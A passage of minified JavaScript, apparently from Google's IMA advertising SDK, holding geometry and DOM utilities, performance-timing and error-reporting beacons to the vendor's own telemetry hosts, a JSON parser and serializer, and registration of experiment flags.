        b instanceof kf ? (a.left += b.x, a.right += b.x, a.top += b.y, a.bottom += b.y) : (a.left += b, a.right += b, "number" === typeof c && (a.top += c, a.bottom += c));
        return a
    };
    F.prototype.scale = function(a, b) {
        b = "number" === typeof b ? b : a;
        this.left *= a;
        this.right *= a;
        this.top *= b;
        this.bottom *= b;
        return this
    };
    var Zf = function(a, b, c, d) {
            this.left = a;
            this.top = b;
            this.width = c;
            this.height = d
        },
        $f = function(a) {
            return new F(a.top, a.left + a.width, a.top + a.height, a.left)
        };
    Zf.prototype.ceil = function() {
        this.left = Math.ceil(this.left);
        this.top = Math.ceil(this.top);
        this.width = Math.ceil(this.width);
        this.height = Math.ceil(this.height);
        return this
    };
    Zf.prototype.floor = function() {
        this.left = Math.floor(this.left);
        this.top = Math.floor(this.top);
        this.width = Math.floor(this.width);
        this.height = Math.floor(this.height);
        return this
    };
    Zf.prototype.round = function() {
        this.left = Math.round(this.left);
        this.top = Math.round(this.top);
        this.width = Math.round(this.width);
        this.height = Math.round(this.height);
        return this
    };
    Zf.prototype.scale = function(a, b) {
        b = "number" === typeof b ? b : a;
        this.left *= a;
        this.width *= a;
        this.top *= b;
        this.height *= b;
        return this
    };
    var ag = function(a) {
        a = void 0 === a ? u : a;
        var b = a.context || a.AMP_CONTEXT_DATA;
        if (!b) try {
            b = a.parent.context || a.parent.AMP_CONTEXT_DATA
        } catch (c) {}
        try {
            if (b && b.pageViewId && b.canonicalUrl) return b
        } catch (c) {}
        return null
    };
    var bg = function(a, b) {
            a.google_image_requests || (a.google_image_requests = []);
            var c = a.document.createElement("img");
            c.src = b;
            a.google_image_requests.push(c)
        },
        dg = function(a, b) {
            var c = "https://pagead2.googlesyndication.com/pagead/gen_204?id=" + b;
            Of(a, function(d, e) {
                d && (c += "&" + e + "=" + encodeURIComponent(d))
            });
            cg(c)
        },
        cg = function(a) {
            var b = window;
            b.fetch ? b.fetch(a, {
                keepalive: !0,
                credentials: "include",
                redirect: "follow",
                method: "get",
                mode: "no-cors"
            }) : bg(b, a)
        };
    var eg = function(a) {
        this.We = a
    };

    function fg(a) {
        return new eg(function(b) {
            return b.substr(0, a.length + 1).toLowerCase() === a + ":"
        })
    }
    var gg = [fg("data"), fg("http"), fg("https"), fg("mailto"), fg("ftp"), new eg(function(a) {
        return /^[^:]*([/?#]|$)/.test(a)
    })];
    var ig = function(a, b) {
            if ("string" === typeof b)(b = hg(a, b)) && (a.style[b] = void 0);
            else
                for (var c in b) {
                    var d = a,
                        e = b[c],
                        f = hg(d, c);
                    f && (d.style[f] = e)
                }
        },
        jg = {},
        hg = function(a, b) {
            var c = jg[b];
            if (!c) {
                var d = bd(b);
                c = d;
                void 0 === a.style[d] && (d = (yd ? "Webkit" : xd ? "Moz" : vd ? "ms" : null) + dd(d), void 0 !== a.style[d] && (c = d));
                jg[b] = c
            }
            return c
        },
        kg = function(a, b) {
            var c = a.style[bd(b)];
            return "undefined" !== typeof c ? c : a.style[hg(a, b)] || ""
        },
        lg = function(a) {
            try {
                return a.getBoundingClientRect()
            } catch (b) {
                return {
                    left: 0,
                    top: 0,
                    right: 0,
                    bottom: 0
                }
            }
        },
        mg = function(a) {
            var b = nf(a),
                c = new kf(0, 0);
            var d = b ? nf(b) : document;
            d = !vd || 9 <= Number(Pd) || "CSS1Compat" == of (d).g.compatMode ? d.documentElement : d.body;
            if (a == d) return c;
            a = lg(a);
            b = uf( of (b).g);
            c.x = a.left + b.x;
            c.y = a.top + b.y;
            return c
        },
        ng = function(a, b) {
            var c = new kf(0, 0),
                d = E(nf(a));
            if (!rd(d, "parent")) return c;
            do {
                if (d == b) var e = mg(a);
                else e = lg(a), e = new kf(e.left, e.top);
                c.x += e.x;
                c.y += e.y
            } while (d && d != b && d != d.parent && (a = d.frameElement) && (d = d.parent));
            return c
        },
        og = function() {
            var a = "100%";
            "number" == typeof a && (a = Math.round(a) +
                "px");
            return a
        },
        qg = function(a) {
            var b = pg;
            a: {
                var c = nf(a);
                if (c.defaultView && c.defaultView.getComputedStyle && (c = c.defaultView.getComputedStyle(a, null))) {
                    c = c.display || c.getPropertyValue("display") || "";
                    break a
                }
                c = ""
            }
            c || (c = a.currentStyle ? a.currentStyle.display : null);
            if ("none" != (c || a.style && a.style.display)) return b(a);
            c = a.style;
            var d = c.display,
                e = c.visibility,
                f = c.position;
            c.visibility = "hidden";
            c.position = "absolute";
            c.display = "inline";
            a = b(a);
            c.display = d;
            c.position = f;
            c.visibility = e;
            return a
        },
        pg = function(a) {
            var b =
                a.offsetWidth,
                c = a.offsetHeight,
                d = yd && !b && !c;
            return (void 0 === b || d) && a.getBoundingClientRect ? (a = lg(a), new lf(a.right - a.left, a.bottom - a.top)) : new lf(b, c)
        };
    var rg = !!window.google_async_iframe_id,
        sg = rg && window.parent || window,
        tg = function() {
            if (rg && !Kf(sg)) {
                var a = "." + Qe.domain;
                try {
                    for (; 2 < a.split(".").length && !Kf(sg);) Qe.domain = a = a.substr(a.indexOf(".") + 1), sg = window.parent
                } catch (b) {}
                Kf(sg) || (sg = window)
            }
            return sg
        };
    var ug = function(a, b) {
            this.g = a;
            this.defaultValue = void 0 === b ? !1 : b
        },
        vg = function(a, b) {
            this.g = a;
            this.defaultValue = void 0 === b ? 0 : b
        };
    var wg = new ug(1930),
        xg = new vg(360261971),
        yg = new vg(1921, 72),
        zg = new vg(1920, 24),
        Ag = new vg(1917, 300),
        Bg = new vg(1916, .001),
        Cg = new ug(1948),
        Dg = new ug(390641437, !0),
        Eg = new ug(1928),
        Fg = new ug(1941),
        Gg = new ug(370946349),
        Hg = new ug(379841917),
        Ig = new ug(393546021);
    var G = function(a) {
        if (a.Fc && a.hasOwnProperty("Fc")) return a.Fc;
        var b = new a;
        return a.Fc = b
    };
    var Jg = function() {
            var a = {};
            this.g = function(b, c) {
                return null != a[b] ? a[b] : c
            };
            this.h = function(b, c) {
                return null != a[b] ? a[b] : c
            }
        },
        Kg = function(a) {
            return G(Jg).g(a.g, a.defaultValue)
        },
        Lg = function(a) {
            return G(Jg).h(a.g, a.defaultValue)
        };
    var Mg = function(a) {
        for (var b = 0, c = a, d = 0; a && a != a.parent;) a = a.parent, d++, Kf(a) && (c = a, b = d);
        return {
            ka: c,
            level: b
        }
    };
    var Ng = function() {
            this.S = {}
        },
        Qg = function() {
            if (Og) var a = Og;
            else {
                a = ((a = ag()) ? Kf(a.master) ? a.master : null : null) || tg();
                var b = a.google_persistent_state_async;
                a = null != b && "object" == typeof b && null != b.S && "object" == typeof b.S ? Og = b : a.google_persistent_state_async = Og = new Ng
            }
            b = tg();
            var c = ag(b);
            c ? ((c = c || ag()) ? (b = c.pageViewId, c = c.clientId, "string" === typeof c && (b += c.replace(/\D/g, "").substr(0, 6))) : b = null, b = +b) : (b = Mg(b).ka, (c = b.google_global_correlator) || (b.google_global_correlator = c = 1 + Math.floor(Math.random() * Math.pow(2,
                43))), b = c);
            c = Pg[7] || "google_ps_7";
            a = a.S;
            var d = a[c];
            a = void 0 === d ? a[c] = b : d;
            return a
        },
        Og = null,
        Rg = {},
        Pg = (Rg[8] = "google_prev_ad_formats_by_region", Rg[9] = "google_prev_ad_slotnames_by_region", Rg);
    var Sg = function() {
        var a;
        this.g = a = void 0 === a ? {} : a
    };
    Sg.prototype.reset = function() {
        this.g = {}
    };

    function Tg(a, b) {
        for (var c = [], d = 1; d < arguments.length; ++d) c[d - 1] = arguments[d];
        if (0 === c.length) return $e(a[0]);
        d = [a[0]];
        for (var e = 0; e < c.length; e++) d.push(encodeURIComponent(c[e])), d.push(a[e + 1]);
        return $e(d.join(""))
    };
    var Ug = function(a, b, c) {
            c = void 0 === c ? {} : c;
            this.error = a;
            this.context = b.context;
            this.msg = b.message || "";
            this.id = b.id || "jserror";
            this.meta = c
        },
        Vg = function(a) {
            return !!(a.error && a.meta && a.id)
        };
    var Wg = null;
    var Xg = function() {
            var a = u.performance;
            return a && a.now && a.timing ? Math.floor(a.now() + a.timing.navigationStart) : Ya()
        },
        Yg = function() {
            var a = void 0 === a ? u : a;
            return (a = a.performance) && a.now ? a.now() : null
        },
        Zg = function(a) {
            var b = u.performance;
            return b && b.timing && b.timing[a] || 0
        },
        $g = function() {
            var a = Math.min(Zg("domLoading") || Infinity, Zg("domInteractive") || Infinity);
            return Infinity == a ? Math.max(Zg("responseEnd"), Zg("navigationStart")) : a
        };
    var ah = function(a, b, c, d, e) {
        this.label = a;
        this.type = b;
        this.value = c;
        this.duration = void 0 === d ? 0 : d;
        this.uniqueId = Math.random();
        this.slotId = e
    };
    var bh = u.performance,
        ch = !!(bh && bh.mark && bh.measure && bh.clearMarks),
        dh = jb(function() {
            var a;
            if (a = ch) {
                var b;
                if (null === Wg) {
                    Wg = "";
                    try {
                        a = "";
                        try {
                            a = u.top.location.hash
                        } catch (c) {
                            a = u.location.hash
                        }
                        a && (Wg = (b = a.match(/\bdeid=([\d,]+)/)) ? b[1] : "")
                    } catch (c) {}
                }
                b = Wg;
                a = !!b.indexOf && 0 <= b.indexOf("1337")
            }
            return a
        }),
        eh = function(a, b) {
            this.events = [];
            this.g = b || u;
            var c = null;
            b && (b.google_js_reporting_queue = b.google_js_reporting_queue || [], this.events = b.google_js_reporting_queue, c = b.google_measure_js_timing);
            this.l = dh() || (null !=
                c ? c : Math.random() < a)
        };
    eh.prototype.C = function() {
        this.l = !1;
        this.events != this.g.google_js_reporting_queue && (dh() && z(this.events, fh), this.events.length = 0)
    };
    eh.prototype.I = function(a) {
        !this.l || 2048 < this.events.length || this.events.push(a)
    };
    var fh = function(a) {
        a && bh && dh() && (bh.clearMarks("goog_" + a.label + "_" + a.uniqueId + "_start"), bh.clearMarks("goog_" + a.label + "_" + a.uniqueId + "_end"))
    };
    eh.prototype.start = function(a, b) {
        if (!this.l) return null;
        a = new ah(a, b, Yg() || Xg());
        b = "goog_" + a.label + "_" + a.uniqueId + "_start";
        bh && dh() && bh.mark(b);
        return a
    };
    eh.prototype.end = function(a) {
        if (this.l && "number" === typeof a.value) {
            a.duration = (Yg() || Xg()) - a.value;
            var b = "goog_" + a.label + "_" + a.uniqueId + "_end";
            bh && dh() && bh.mark(b);
            this.I(a)
        }
    };
    var gh = fa(["https://pagead2.googlesyndication.com/pagead/js/err_rep.js"]),
        hh = function() {
            this.h = "jserror";
            this.l = !1;
            this.g = null;
            this.o = !1;
            this.A = Math.random();
            this.B = this.Ha;
            this.C = null
        };
    l = hh.prototype;
    l.Sc = function(a) {
        this.h = a
    };
    l.kc = function(a) {
        this.g = a
    };
    l.Tc = function(a) {
        this.l = a
    };
    l.Uc = function(a) {
        this.o = a
    };
    l.Ha = function(a, b, c, d, e) {
        e = void 0 === e ? this.h : e;
        if ((this.o ? this.A : Math.random()) > (void 0 === c ? .01 : c)) return this.l;
        Vg(b) || (b = new Ug(b, {
            context: a,
            id: e
        }));
        if (d || this.g) b.meta = {}, this.g && this.g(b.meta), d && d(b.meta);
        u.google_js_errors = u.google_js_errors || [];
        u.google_js_errors.push(b);
        if (!u.error_rep_loaded) {
            c = Tg(gh);
            var f;
            a = u.document;
            b = null != (f = this.C) ? f : hc(af(c).toString());
            f = a.createElement("script");
            f.src = af(b);
            cf(f);
            (a = a.getElementsByTagName("script")[0]) && a.parentNode && a.parentNode.insertBefore(f,
                a);
            u.error_rep_loaded = !0
        }
        return this.l
    };
    l.fb = function(a, b, c) {
        try {
            var d = b()
        } catch (e) {
            if (!this.B(a, e, .01, c, this.h)) throw e;
        }
        return d
    };
    l.Pc = function(a, b, c, d) {
        var e = this;
        return function(f) {
            for (var g = [], h = 0; h < arguments.length; ++h) g[h - 0] = arguments[h];
            return e.fb(a, function() {
                return b.apply(c, g)
            }, d)
        }
    };
    var ih = function(a) {
            return {
                visible: 1,
                hidden: 2,
                prerender: 3,
                preview: 4,
                unloaded: 5
            }[a.visibilityState || a.webkitVisibilityState || a.mozVisibilityState || ""] || 0
        },
        jh = function(a) {
            var b;
            a.visibilityState ? b = "visibilitychange" : a.mozVisibilityState ? b = "mozvisibilitychange" : a.webkitVisibilityState && (b = "webkitvisibilitychange");
            return b
        };
    var kh = function(a) {
        a = a._google_rum_ns_ = a._google_rum_ns_ || {};
        return a.pq = a.pq || []
    };
    var lh = function(a, b, c) {
            Of(b, function(d, e) {
                var f = c && c[e];
                !d && 0 !== d || f || (a += "&" + encodeURIComponent(e) + "=" + encodeURIComponent(String(d)), c && (c[e] = !0))
            });
            return a
        },
        th = function(a, b, c, d, e, f, g, h) {
            f = void 0 === f ? Infinity : f;
            g = void 0 === g ? !1 : g;
            eh.call(this, a, h);
            var k = this;
            this.L = 0;
            this.K = f;
            this.$ = b;
            this.J = c;
            this.Y = d;
            this.aa = e;
            a = this.g.navigator;
            this.V = !("csi.gstatic.com" !== this.J || !a || !a.sendBeacon);
            this.B = {};
            this.H = {};
            this.g.performance && this.g.performance.now || mh(this, "dat", 1);
            a && a.deviceMemory && mh(this, "dmc",
                a.deviceMemory);
            this.g === this.g.top && mh(this, "top", 1);
            this.T = !g;
            this.M = function() {
                k.g.setTimeout(function() {
                    return nh(k)
                }, 1100)
            };
            this.sa = [];
            this.X = function() {
                oh(k, 1)
            };
            this.R = function() {
                oh(k, 2)
            };
            this.da = lb(function() {
                nh(k)
            });
            this.ua = function() {
                var m = k.g.document;
                (null != m.hidden ? m.hidden : null != m.mozHidden ? m.mozHidden : null != m.webkitHidden && m.webkitHidden) && k.da()
            };
            this.D = this.g.setTimeout(function() {
                return nh(k)
            }, 5E3);
            this.A = {};
            this.o = b.length + c.length + d.length + e.length + 3;
            this.h = 0;
            z(this.events, function(m) {
                return ph(k,
                    m)
            });
            this.G = [];
            b = kh(this.g);
            var n = function(m) {
                var v = m[0];
                m = m[1];
                var r = v.length + m.length + 2;
                8E3 < k.o + k.h + r && nh(k);
                k.G.push([v, m]);
                k.h += r;
                qh(k);
                return 0
            };
            z(b, function(m) {
                return n(m)
            });
            b.length = 0;
            b.push = n;
            rh(this);
            sh(this)
        };
    t(th, eh);
    var sh = function(a) {
            "complete" === a.g.document.readyState ? a.g.setTimeout(function() {
                return nh(a)
            }, 0) : ff(a.g, "load", a.M);
            var b = jh(a.g.document);
            "undefined" !== typeof b && ff(a.g, b, a.ua);
            ff(a.g, "unload", a.X);
            ff(a.g, "pagehide", a.R)
        },
        mh = function(a, b, c) {
            c = String(c);
            a.o = null != a.B[b] ? a.o + (c.length - a.B[b].length) : a.o + (b.length + c.length + 2);
            a.B[b] = c
        },
        uh = function(a) {
            null != a.B.uet && (a.o -= 3 + a.B.uet.length + 2, delete a.B.uet)
        },
        xh = function(a, b, c, d, e) {
            e = void 0 === e ? "" : e;
            var f = vh(a, b, c, d, e);
            8E3 < a.o + a.h + f && (nh(a), f = b.length +
                c.length + 2);
            wh(a, b, c, d, e);
            a.h += f;
            qh(a)
        },
        vh = function(a, b, c, d, e) {
            return null == a.A[b] ? b.length + c.length + 2 : d ? c.length + (void 0 === e ? "" : e).length : c.length - a.A[b].length
        },
        wh = function(a, b, c, d, e) {
            a.A[b] = d && null != a.A[b] ? a.A[b] + ("" + (void 0 === e ? "" : e) + c) : c
        },
        qh = function(a) {
            6E3 <= a.o + a.h && nh(a)
        },
        nh = function(a) {
            if (a.l && a.T) {
                try {
                    if (a.h) {
                        var b = a.A;
                        a.L++;
                        var c = yh(a, b);
                        b = !1;
                        try {
                            b = !!(a.V && a.g.navigator && a.g.navigator.sendBeacon(c, null))
                        } catch (d) {
                            a.V = !1
                        }
                        b || bg(a.g, c);
                        rh(a);
                        a.L === a.K && a.C()
                    }
                } catch (d) {
                    (new hh).Ha(358, d)
                }
                a.A = {};
                a.h = 0;
                a.events.length = 0;
                a.g.clearTimeout(a.D);
                a.D = 0
            }
        },
        yh = function(a, b) {
            var c = a.$ + "//" + a.J + a.Y + a.aa,
                d = {};
            c = lh(c, a.B, d);
            c = lh(c, b, d);
            a.g.google_timing_params && (c = lh(c, a.g.google_timing_params, d), a.g.google_timing_params = void 0);
            z(a.G, function(e) {
                var f = q(e);
                e = f.next().value;
                f = f.next().value;
                var g = {};
                c = lh(c, (g[e] = f, g))
            });
            a.G.length = 0;
            return c
        },
        rh = function(a) {
            mh(a, "puid", (a.L + 1).toString(36) + "~" + Ya().toString(36))
        },
        ph = function(a, b) {
            var c = "met." + b.type,
                d = "number" === typeof b.value ? Math.round(b.value).toString(36) :
                b.value,
                e = Math.round(b.duration);
            b = "" + b.label + (null != b.slotId ? "_" + b.slotId : "") + ("." + d) + (0 < e ? "_" + e.toString(36) : "");
            xh(a, c, b, !0, "~")
        };
    th.prototype.I = function(a) {
        this.l && this.L < this.K && (eh.prototype.I.call(this, a), ph(this, a))
    };
    th.prototype.C = function() {
        eh.prototype.C.call(this);
        this.g.clearTimeout(this.D);
        this.h = this.D = 0;
        this.A = {};
        Ub(this.H);
        Ub(this.B);
        gf(this.g, "load", this.M);
        gf(this.g, "unload", this.X);
        gf(this.g, "pagehide", this.R)
    };
    var oh = function(a, b) {
        mh(a, "uet", b);
        z(a.sa, function(c) {
            try {
                c()
            } catch (d) {}
        });
        hf(a.g);
        nh(a);
        uh(a)
    };
    var zh = function(a) {
        var b = [],
            c = [],
            d = {},
            e = function(f, g) {
                var h = g + "  ";
                try {
                    if (void 0 === f) b.push("undefined");
                    else if (null === f) b.push("NULL");
                    else if ("string" === typeof f) b.push('"' + f.replace(/\n/g, "\n" + g) + '"');
                    else if ("function" === typeof f) b.push(String(f).replace(/\n/g, "\n" + g));
                    else if (Na(f)) {
                        f[Oa] || c.push(f);
                        var k = Ra(f);
                        if (d[k]) b.push("*** reference loop detected (id=" + k + ") ***");
                        else {
                            d[k] = !0;
                            b.push("{");
                            for (var n in f) "function" !== typeof f[n] && (b.push("\n"), b.push(h), b.push(n + " = "), e(f[n], h));
                            b.push("\n" +
                                g + "}");
                            delete d[k]
                        }
                    } else b.push(f)
                } catch (m) {
                    b.push("*** " + m + " ***")
                }
            };
        e(a, "");
        for (a = 0; a < c.length; a++) Ta(c[a]);
        return b.join("")
    };
    var Ah = function() {
            this.g = new th(1, "https:", "csi.gstatic.com", "/csi?v=2&s=", "ima", void 0, !0);
            var a = Qg();
            null != a && mh(this.g, "c", a);
            a = parseInt(this.g.B.c, 10) / 2;
            null != a && mh(this.g, "slotId", a)
        },
        I = function(a, b, c) {
            if (null != c) {
                a = a.g;
                var d = b + "=" + c;
                a.H[d] || (xh(a, b, c, !1), 1E3 > d.length && (a.H[d] = !0))
            }
        },
        Bh = function(a, b) {
            for (var c in b) b[c] = "object" === typeof b[c] ? encodeURIComponent(JSON.stringify(b[c])) : encodeURIComponent(String(b[c]));
            a = a.g;
            c = !1;
            var d = 0,
                e;
            for (e in b) null != a.A[e] && (c = !0), d += vh(a, e, b[e], !1);
            (8E3 <
                a.o + a.h + d || c) && nh(a);
            for (var f in b) wh(a, f, b[f], !1);
            a.h += d;
            qh(a)
        },
        Ch = function(a) {
            var b = J().g,
                c = Xg() - 0;
            b.l && b.I(new ah(a, 4, c, 0, void 0))
        },
        J = function() {
            return G(Ah)
        };
    var Dh = function(a) {
            return /^\s*$/.test(a) ? !1 : /^[\],:{}\s\u2028\u2029]*$/.test(a.replace(/\\["\\\/bfnrtu]/g, "@").replace(/(?:"[^"\\\n\r\u2028\u2029\x00-\x08\x0a-\x1f]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)[\s\u2028\u2029]*(?=:|,|]|}|$)/g, "]").replace(/(?:^|:|,)(?:[\s\u2028\u2029]*\[)+/g, ""))
        },
        Eh = function(a) {
            try {
                return u.JSON.parse(a)
            } catch (b) {}
            a = String(a);
            if (Dh(a)) try {
                return eval("(" + a + ")")
            } catch (b) {}
            throw Error("Invalid JSON string: " + a);
        },
        Fh = function(a) {
            this.g = a
        },
        Hh = function(a, b) {
            var c = [];
            Gh(a, b, c);
            return c.join("")
        },
        Gh = function(a, b, c) {
            if (null == b) c.push("null");
            else {
                if ("object" == typeof b) {
                    if (Array.isArray(b)) {
                        var d = b;
                        b = d.length;
                        c.push("[");
                        for (var e = "", f = 0; f < b; f++) c.push(e), e = d[f], Gh(a, a.g ? a.g.call(d, String(f), e) : e, c), e = ",";
                        c.push("]");
                        return
                    }
                    if (b instanceof String || b instanceof Number || b instanceof Boolean) b = b.valueOf();
                    else {
                        c.push("{");
                        f = "";
                        for (d in b) Object.prototype.hasOwnProperty.call(b, d) && (e = b[d], "function" != typeof e && (c.push(f), Ih(d, c), c.push(":"), Gh(a, a.g ? a.g.call(b, d,
                            e) : e, c), f = ","));
                        c.push("}");
                        return
                    }
                }
                switch (typeof b) {
                    case "string":
                        Ih(b, c);
                        break;
                    case "number":
                        c.push(isFinite(b) && !isNaN(b) ? String(b) : "null");
                        break;
                    case "boolean":
                        c.push(String(b));
                        break;
                    case "function":
                        c.push("null");
                        break;
                    default:
                        throw Error("Unknown type: " + typeof b);
                }
            }
        },
        Jh = {
            '"': '\\"',
            "\\": "\\\\",
            "/": "\\/",
            "\b": "\\b",
            "\f": "\\f",
            "\n": "\\n",
            "\r": "\\r",
            "\t": "\\t",
            "\x0B": "\\u000b"
        },
        Kh = /\uffff/.test("\uffff") ? /[\\"\x00-\x1f\x7f-\uffff]/g : /[\\"\x00-\x1f\x7f-\xff]/g,
        Ih = function(a, b) {
            b.push('"', a.replace(Kh,
                function(c) {
                    var d = Jh[c];
                    d || (d = "\\u" + (c.charCodeAt(0) | 65536).toString(16).substr(1), Jh[c] = d);
                    return d
                }), '"')
        };
    var Lh = function() {
            this.l = null;
            this.g = "missing-id";
            this.h = !1
        },
        Nh = function(a) {
            var b = null;
            try {
                b = document.getElementsByClassName("lima-exp-data")
            } catch (c) {
                return Mh("missing-element", a.g), null
            }
            if (1 < b.length) return Mh("multiple-elements", a.g), null;
            b = b[0];
            return b ? b.innerHTML : (Mh("missing-element", a.g), null)
        },
        Ph = function() {
            var a = Oh,
                b = Nh(a);
            if (null !== b)
                if (Dh(b)) {
                    var c = JSON.parse(b);
                    b = c.experimentIds;
                    var d = c.binaryIdentifier;
                    c = c.adEventId;
                    var e = "string" === typeof d;
                    if ("string" == typeof c) {
                        var f = J();
                        null != c &&
                            mh(f.g, "qqid", c)
                    }
                    e && (a.g = d);
                    "string" !== typeof b ? Mh("missing-flags", a.g) : (e || Mh("missing-binary-id", a.g), a.l = b)
                } else Mh("invalid-json", a.g)
        };
    Lh.prototype.reset = function() {
        this.l = null;
        this.g = "missing-id"
    };
    var Rh = function(a, b, c, d, e) {
            this.id = a;
            this.F = b;
            this.o = c;
            this.g = !1;
            this.l = d;
            this.h = e;
            this.o && Qh(this)
        },
        Sh = function(a) {
            return a.g || a.o
        },
        Qh = function(a) {
            if (a.l && a.h) {
                var b = a.l;
                b && Object.assign(a.h.g, b)
            }
        },
        Th = function() {
            this.g = []
        },
        Uh = function() {
            this.g = new Map;
            this.h = !1;
            this.B = new Th;
            this.A = new Rh(0, 0, !1);
            this.l = [this.B];
            this.o = new Sg
        },
        K = function(a) {
            var b = Vh;
            if (b.h || b.g.has(a.id) || null == a.F && null == a.control || 0 == a.ue) return b.A;
            var c = b.B;
            if (null != a.control)
                for (var d = q(b.l), e = d.next(); !e.done; e = d.next()) {
                    if (e =
                        e.value, e.g.includes(a.control)) {
                        c = e;
                        break
                    }
                } else null != a.Ba && (c = a.Ba);
            d = 0;
            null != a.control ? d = a.control.F : null != a.F && (d = a.F);
            a = new Rh(a.id, d, !!a.vh, a.flags, b.o);
            c.g.push(a);
            b.l.includes(c) || b.l.push(c);
            b.g.set(a.id, a);
            return a
        },
        Wh = function() {
            var a = Vh;
            return [].concat(ha(a.g.keys())).filter(function(b) {
                return Sh(this.g.get(b))
            }, a)
        },
        Xh = function(a) {
            var b = Vh;
            b.h || (a.g(b.l, b.g), b.h = !0)
        };
    Uh.prototype.reset = function() {
        for (var a = q(this.g), b = a.next(); !b.done; b = a.next()) b = q(b.value), b.next(), b.next().value.g = !1;
        this.h = !1;
        this.o.reset()
    };
    var Vh = new Uh,
        Zh = function() {
            return Yh.g.filter(function(a) {
                return Sh(a)
            }).map(function(a) {
                return a.id
            })
        };
    var $h = function() {};
    $h.prototype.g = function(a) {
        a = q(a);
        for (var b = a.next(); !b.done; b = a.next()) {
            var c = 0,
                d = Math.floor(1E3 * Math.random());
            b = q(b.value.g);
            for (var e = b.next(); !e.done; e = b.next())
                if (e = e.value, c += e.F, d < c) {
                    e.g = !0;
                    Qh(e);
                    break
                }
        }
    };
    var bi = function(a) {
        B.call(this, a, -1, ai)
    };
    t(bi, B);
    var ai = [2, 8],
        ci = [3, 4, 5];
    var ei = function(a) {
        B.call(this, a, -1, di)
    };
    t(ei, B);
    var di = [4];
    var gi = function(a) {
        B.call(this, a, -1, fi)
    };
    t(gi, B);
    var fi = [5],
        hi = [1, 2, 3, 6, 7];
    var ji = function(a) {
        B.call(this, a, -1, ii)
    };
    t(ji, B);
    ji.prototype.getId = function() {
        return Ce(this, 1, 0)
    };
    var ii = [2];
    var li = function(a) {
        B.call(this, a, -1, ki)
    };
    t(li, B);
    var ki = [2];
    var ni = function(a) {
        B.call(this, a, -1, mi)
    };
    t(ni, B);
    var pi = function(a) {
        B.call(this, a, -1, oi)
    };
    t(pi, B);
    var mi = [1, 4, 2, 3],
        oi = [2];
    var qi = function(a, b) {
            switch (b) {
                case 1:
                    return Oe(a, 1, hi);
                case 2:
                    return Oe(a, 2, hi);
                case 3:
                    return Oe(a, 3, hi);
                case 6:
                    return Oe(a, 6, hi);
                default:
                    return null
            }
        },
        ri = function(a, b) {
            if (!a) return null;
            switch (b) {
                case 1:
                    return De(a, 1);
                case 7:
                    return Ce(a, 3, "");
                case 2:
                    var c = void 0 === c ? 0 : c;
                    a = Ae(a, 2);
                    return null == a ? c : a;
                case 3:
                    return Ce(a, 3, "");
                case 6:
                    return C(a, 4);
                default:
                    return null
            }
        };
    var si = {},
        ti = (si[47] = Qd, si);

    function ui() {
        var a = vi,
            b = Je(new ni(wi), pi, 2);
        1 == b.length && 16 == Ce(b[0], 1, 0) && Je(b[0], li, 2).forEach(function(c) {
            var d = Ce(c, 1, 0),
                e = Ie(c, bi, 3),
                f = a[Ce(c, 4, 0)];
            Je(c, ji, 2).forEach(function(g) {
                var h = d || Ce(g, 4, 0),
                    k = g.getId(),
                    n = e || Ie(g, bi, 3);
                n = n ? Oe(n, 3, ci) : null;
                n = ti[n];
                g = xi(Je(g, gi, 2));
                K({
                    id: k,
                    F: h,
                    Ba: f,
                    ue: n,
                    flags: g
                })
            })
        })
    }

    function xi(a) {
        if (a.length) {
            var b = {};
            a.forEach(function(c) {
                var d = He(c, hi),
                    e = Ie(c, ei, 4);
                e && (c = qi(c, d), d = ri(e, d), b[c] = d)
            });
            return b
        }
    };
    var yi = function(a) {
        this.h = a
    };
    yi.prototype.g = function(a, b) {
        a = q(this.h);
        for (var c = a.next(); !c.done; c = a.next())
            if (c = b.get(c.value)) c.g = !0, Qh(c)
    };
    var zi = function(a, b) {
        this.h = a;
        this.l = b
    };
    t(zi, yi);
    zi.prototype.g = function(a, b) {
        yi.prototype.g.call(this, a, b);
        var c = [];
        a = [];
        for (var d = q(this.h), e = d.next(); !e.done; e = d.next()) e = e.value, b.get(e) ? c.push(e) : a.push(e);
        b = c.map(String).join(",") || "0";
        a = a.map(String).join(",") || "0";
        I(J(), "sei", b);
        I(J(), "nsei", a);
        I(J(), "bi", this.l)
    };
    var Ai = function() {
        Lh.apply(this, arguments)
    };
    t(Ai, Lh);
    var Mh = function(a, b) {
        var c = J();
        I(c, "eee", a);
        I(c, "bi", b)
    };

    function Bi() {
        return Ci.split(",").map(function(a) {
            return parseInt(a, 10)
        }).filter(function(a) {
            return !isNaN(a)
        })
    };
    var Yh = new Th,
        Di = new Th,
        Ei = new Th,
        Fi = new Th;
    K({
        id: 318475490,
        F: 0
    });
    K({
        id: 324123032,
        F: 0
    });
    K({
        id: 418572103,
        F: 0
    });
    K({
        id: 420706097,
        F: 10
    });
    K({
        id: 420706098,
        F: 10
    });
    K({
        id: 44736152,
        F: 10
    });
    K({
        id: 44736153,
        F: 10
    });
    K({
        id: 44736284,
        F: 10
    });
    K({
        id: 44736285,
        F: 10
    });
    K({
        id: 21062100,
        F: 0
    });
    K({
        id: 21062101,
        F: 0
    });
    K({
        id: 420706109,
        F: 10
    });
    K({
        id: 420706110,
        F: 10
    });
    K({
        id: 21062347,
        F: 0
    });
    K({
        id: 21063070,
        F: 0
    });
    K({
        id: 21063072,
        F: 0
    });
    K({
        id: 21063100,
        F: 0
    });
    K({
        id: 420706105,
        F: 10
    });
    K({
        id: 420706106,
        F: 10
    });
    K({
        id: 21064018,
        F: 0
    });
    K({
        id: 21064020,
        F: 0
    });
    K({
        id: 21064022,
        F: 0
    });
    K({
        id: 21064024,
        F: 0
    });
    K({
        id: 21064075,
        F: 0
    });
    K({
        id: 21064201,
        F: 50
    });
    var Gi = K({
        id: 210640812,
        F: 10
    });
    K({
        id: 420706142,
        F: 0
    });
    K({
        id: 21064347,
        F: 0
    });
    K({
        id: 44745813,
        F: 0
    });
    K({
        id: 44746068,
        F: 0
    });
    K({
        id: 21064565,
        F: 0
    });
    K({
        id: 21064567,
        F: 0
    });
    K({
        id: 40819804,
        F: 10
    });
    var Hi = K({
        id: 40819805,
        F: 10
    });
    K({
        id: 418572006,
        F: 10
    });
    var Ii = K({
            id: 44744588,
            F: 10
        }),
        Ji = K({
            id: 44747319,
            F: 10
        });
    K({
        id: 44740339,
        F: 10
    });
    var Ki = K({
        id: 44740340,
        F: 10
    });
    K({
        id: 44714743,
        F: 0
    });
    K({
        id: 44719216,
        F: 0
    });
    K({
        id: 44730895,
        F: 10
    });
    K({
